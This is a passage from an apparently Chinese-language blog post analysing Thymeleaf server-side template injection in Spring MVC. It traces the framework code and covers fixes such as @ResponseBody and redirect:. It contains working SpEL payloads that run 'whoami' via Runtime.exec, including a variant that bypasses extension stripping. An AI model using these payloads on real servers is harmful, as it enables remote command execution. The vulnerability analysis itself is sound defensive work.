<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doDispatch</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">     ...</span><br><span class="line">                    mv = ha.handle(processedRequest, response, mappedHandler.getHandler());</span><br><span class="line">                    <span class="keyword">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">this</span>.applyDefaultViewName(processedRequest, mv);</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>

<p><code>applyDefaultViewName</code>中判断当<code>ModelAndView</code>为空，则通过<code>getDefaultViewName</code> 获取请求路径作为<code>ViewName</code>。这也是在<code>urlPath</code>中传入Payload可以执行的原因。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">applyDefaultViewName</span><span class="params">(HttpServletRequest request, <span class="meta">@Nullable</span> ModelAndView mv)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (mv != <span class="keyword">null</span> &amp;&amp; !mv.hasView()) &#123;</span><br><span class="line">        String defaultViewName = <span class="keyword">this</span>.getDefaultViewName(request);</span><br><span class="line">        <span class="keyword">if</span> (defaultViewName != <span class="keyword">null</span>) &#123;</span><br><span class="line">            mv.setViewName(defaultViewName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是需要注意的是如果要在<code>urlPath</code>中传入payload,则不能有返回值，否则就不会调用<code>applyDefaultViewName</code>设置了。下面的方式将不会导致代码执行。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/doc/&#123;document&#125;&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getDocument</span><span class="params">(<span class="meta">@PathVariable</span> String document, HttpServletResponse response)</span> </span>&#123;</span><br><span class="line">    log.info(<span class="string">&quot;Retrieving &quot;</span> + document);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;welcome&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="回显失败问题分析"><a href="#回显失败问题分析" class="headerlink" title="回显失败问题分析"></a>回显失败问题分析</h2><p>​    当在URL PATH中使用下面的POC会拿不到结果。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/doc/__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22whoami%22).getInputStream()).next()%7d__::.x</span><br></pre></td></tr></table></figure>

<p>​    经过分析问题主要是在<code>StandardExpressionParser#parseExpression</code>,在<code>preprocess</code>预处理结束后还会通过<code>Expression.parse</code>进行一次解析，这里如果解析失败则不会回显。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> IStandardExpression <span class="title">parseExpression</span><span class="params">(IExpressionContext context, String input, <span class="keyword">boolean</span> preprocess)</span> </span>&#123;</span><br><span class="line">       IEngineConfiguration configuration = context.getConfiguration();</span><br><span class="line">       String preprocessedInput = preprocess ? StandardExpressionPreprocessor.preprocess(context, input) : input;</span><br><span class="line">       IStandardExpression cachedExpression = ExpressionCache.getExpressionFromCache(configuration, preprocessedInput);</span><br><span class="line">       <span class="keyword">if</span> (cachedExpression != <span class="keyword">null</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> cachedExpression;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           Expression expression = Expression.parse(preprocessedInput.trim());</span><br><span class="line">           <span class="keyword">if</span> (expression == <span class="keyword">null</span>) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> TemplateProcessingException(<span class="string">&quot;Could not parse as expression: \&quot;&quot;</span> + input + <span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               ExpressionCache.putExpressionIntoCache(configuration, preprocessedInput, expression);</span><br><span class="line">               <span class="keyword">return</span> expression;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>​        使用上面的<code>POC</code>，<code>parse</code>的内容如下，这里可以看到<code>::</code>后没有内容，因此这里肯定是会失败的。</p>
<p><img src="/2021/11/11/Thymeleaf-SSTI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211110182419342.png" alt="image-20211110182419342"></p>
<p>​    而在<code>templatename</code>那个Demo中，<code>parse</code>内容如下是<code>::</code>后是有内容的。所以能否回显的关键就是<code>Expression.parse</code>能否正常执行。</p>
<p><img src="/2021/11/11/Thymeleaf-SSTI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211110182644124.png" alt="image-20211110182644124"></p>
<p>​    <strong>但是我们在<code>URL PATH</code>的POC中也设置了<code>::.x</code>为什么会被去掉呢？</strong></p>
<p>​    在分析<code>URL PATH</code>这种方式能获取<code>ModelAndView</code>的原因时，我们分析过会在<code>applyDefaultViewName</code>中获取URL Path作为<code>ModelAndView</code>的name，这个操作在<code>getViewName</code>中完成，<code>getLookupPathForRequest</code>仅仅获取了请求的地址并没有对后面的<code>.x</code>做处理，处理主要是在<code>transformPath</code>中完成的。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getViewName</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">    String lookupPath = <span class="keyword">this</span>.urlPathHelper.getLookupPathForRequest(request, HandlerMapping.LOOKUP_PATH);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.prefix + <span class="keyword">this</span>.transformPath(lookupPath) + <span class="keyword">this</span>.suffix;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/11/11/Thymeleaf-SSTI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211111093605313.png" alt="image-20211111093605313"></p>
<p>​    <code>transformPath</code>中通过<code>stripFilenameExtension</code>去除后缀，是这部分导致了<code>.x</code>后内容为空。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> String <span class="title">transformPath</span><span class="params">(String lookupPath)</span> </span>&#123;</span><br><span class="line">       String path = lookupPath;</span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">this</span>.stripLeadingSlash &amp;&amp; lookupPath.startsWith(<span class="string">&quot;/&quot;</span>)) &#123;</span><br><span class="line">           path = lookupPath.substring(<span class="number">1</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">this</span>.stripTrailingSlash &amp;&amp; path.endsWith(<span class="string">&quot;/&quot;</span>)) &#123;</span><br><span class="line">           path = path.substring(<span class="number">0</span>, path.length() - <span class="number">1</span>);</span><br><span class="line">       &#125;</span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">this</span>.stripExtension) &#123;</span><br><span class="line">           path = StringUtils.stripFilenameExtension(path);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (!<span class="string">&quot;/&quot;</span>.equals(<span class="keyword">this</span>.separator)) &#123;</span><br><span class="line">           path = StringUtils.replace(path, <span class="string">&quot;/&quot;</span>, <span class="keyword">this</span>.separator);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> path;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><code>stripFilenameExtension</code>去除最后一个<code>.</code>后的内容，所以可以通过下面的方式绕过。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/doc/__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;whoami&quot;).getInputStream()).next()%7d__::assadasd.asdas</span><br></pre></td></tr></table></figure>

<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><h3 id="配置-ResponseBody"><a href="#配置-ResponseBody" class="headerlink" title="配置 @ResponseBody"></a>配置 @ResponseBody</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/doc/&#123;document&#125;&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getDocument</span><span class="params">(<span class="meta">@PathVariable</span> String document)</span> </span>&#123;</span><br><span class="line">    log.info(<span class="string">&quot;Retrieving &quot;</span> + document);</span><br><span class="line">    <span class="comment">//returns void, so view name is taken from URI</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​      配置了<code>ResponseBody</code>注解确实无法触发，经过调试在<code>applyDefaultViewName</code>中<code>ModelAndView</code>是<code>Null</code>而非<code>ModelAndView</code>对象，所以<code>hasView()</code>会导致异常，不会设置视图名。</p>
<p><img src="/2021/11/11/Thymeleaf-SSTI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211111101343710.png" alt="image-20211111101343710"></p>
<p>​    所以我们要分析创建<code>ModelAndView</code>对象的方法，也就是<code>getModelAndView</code>，这里<code>requestHandled</code>设置为<code>True</code>时会返回Null，而不会创建视图。</p>
<p><img src="/2021/11/11/Thymeleaf-SSTI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211111101817862.png" alt="image-20211111101817862"></p>
<p>​    当我们设置了<code>ResponseBody</code>注解后，handler返回的是<code>RequestResponseBodyMethodProcesser</code>,所以这里会调用它的<code>handleReturnValue</code>,设置了<code>RequestHandled</code>属性为True。</p>
<p><img src="/2021/11/11/Thymeleaf-SSTI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211111102133644.png" alt="image-20211111102133644"></p>
<p><img src="/2021/11/11/Thymeleaf-SSTI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211111102444570.png" alt="image-20211111102444570"></p>
<p>​    配置<code>RestController</code>修复和这种方式类似，也是由于使用<code>RequestResponseBodyMethodProcesser</code>设置了<code>RequestHandled</code>属性导致不能得到<code>ModelAndView</code>对象了。 </p>
<p><img src="/2021/11/11/Thymeleaf-SSTI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211111102824449.png" alt="image-20211111102824449"></p>
<p>​    有小伙伴可能要问，上面只是讲的<code>URL PATH</code>中的修复，<code>templatename</code>中这种方式也能修复嘛？答案是肯定的，根本原因在设置了<code>RequestHandled</code>属性后，<code>ModelAndView</code>一定会返回Null。</p>
<p><img src="/2021/11/11/Thymeleaf-SSTI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211111103201382.png" alt="image-20211111103201382"></p>
<h3 id="通过redirect"><a href="#通过redirect" class="headerlink" title="通过redirect:"></a>通过redirect:</h3><blockquote>
<p>根据spring boot定义，如果名称以<code>redirect:</code>开头，则不再调用<code>ThymeleafView</code>解析，调用<code>RedirectView</code>去解析<code>controller</code>的返回值</p>
</blockquote>
<p>​    所以配置<code>redirect：</code>主要影响的是获取视图的部分。在<code>ThymeleafViewResolver#createView</code>中，如果视图名以<code>redirect:</code>开头，则会创建<code>RedirectView</code>并返回。所以不会使用<code>ThymeleafView</code>解析。</p>
<p><img src="/2021/11/11/Thymeleaf-SSTI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211111112136043.png" alt="image-20211111112136043"></p>
<h3 id="方法参数中设置HttpServletResponse-参数"><a href="#方法参数中设置HttpServletResponse-参数" class="headerlink" title="方法参数中设置HttpServletResponse 参数"></a>方法参数中设置HttpServletResponse 参数</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/doc/&#123;document&#125;&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getDocument</span><span class="params">(<span class="meta">@PathVariable</span> String document, HttpServletResponse response)</span> </span>&#123;</span><br><span class="line">    log.info(<span class="string">&quot;Retrieving &quot;</span> + document);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>由于controller的参数被设置为HttpServletResponse，Spring认为它已经处理了HTTP Response，因此不会发生视图名称解析。</p>
</blockquote>
<p>​    首先声明下<strong>这种方式只对返回值为空的情况下有效，也就是<code>URL PATH</code>的方式</strong>，下面我会解释一下原因。</p>
<p>​    设置了<code>HttpServletResponse</code>后也是设置<code>requestHandled</code>设置为True导致在<code>applyDefaultViewName</code>无法设置默认的ViewName。</p>
<p>​    但是它的设置是在<code>ServletInvocableHandlerMethod#invokeAndHandle</code>中。由于<code>mavContainer.isRequestHandled()</code>被设置为True，所以进入到IF语句中设置了<code>requestHandled</code>属性，但是这里的前提条件是<code>returnValue</code>为空，所以这种修复方法只有在返回值为空的情况下才有效。</p>
<p><img src="/2021/11/11/Thymeleaf-SSTI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211111140448233.png" alt="image-20211111140448233"></p>
<p>​    <code>requestHandled</code>的属性设置在<code>HandlerMethodArgumentResolverComposite#resolveArgument</code>解析参数时，这里不同的传参方式获得的<code>ArgumentResolver</code>是不同的，比如没加<code>HttpServletResponse </code>时得到的是<code>PathVariableMethodArgumentResolver</code>。</p>
<p><img src="/2021/11/11/Thymeleaf-SSTI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211111140846800.png" alt="image-20211111140846800"></p>
<p>​    加上后会对<code>HttpServletResponse</code>也进行参数解析，解析后的结果为<code>ServletResponseMethodArgumentResolver</code>，在它的<code>resolveArgument</code>方法中，会设置<code>requestHandled</code>属性。</p>
<p><img src="/2021/11/11/Thymeleaf-SSTI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211111142308019.png" alt="image-20211111142308019"></p>
<p><img src="/2021/11/11/Thymeleaf-SSTI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211111142351880.png" alt="image-20211111142351880"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​    <code>Thymeleaf</code> 模板注入和我理解的不太一样，之前以为这种模板注入应该是解析特定标签时候导致的问题。 从修复的角度来讲使用<code>@ResponseBody</code>或者<code>@RestController</code>更容易修复漏洞，而设置<code>HttpServletResponse </code>有一定的局限性，对<code>templatename</code>的方式无用。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/254519">Java安全之Thymeleaf SSTI分析</a></li>
<li><a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/769977">Thymeleaf一篇就够了</a></li>
</ul>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/漏洞分析/">漏洞分析</a>
    </span>
    

    

    </div>

    
  </div>
</article>

  






    </main>

    <footer class="site-footer">
  <p class="site-info">
    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
    </br>
    
    &copy; 2021 藏青
    
  </p>
</footer>
    
    
  </div>
</div>
</body>
</html>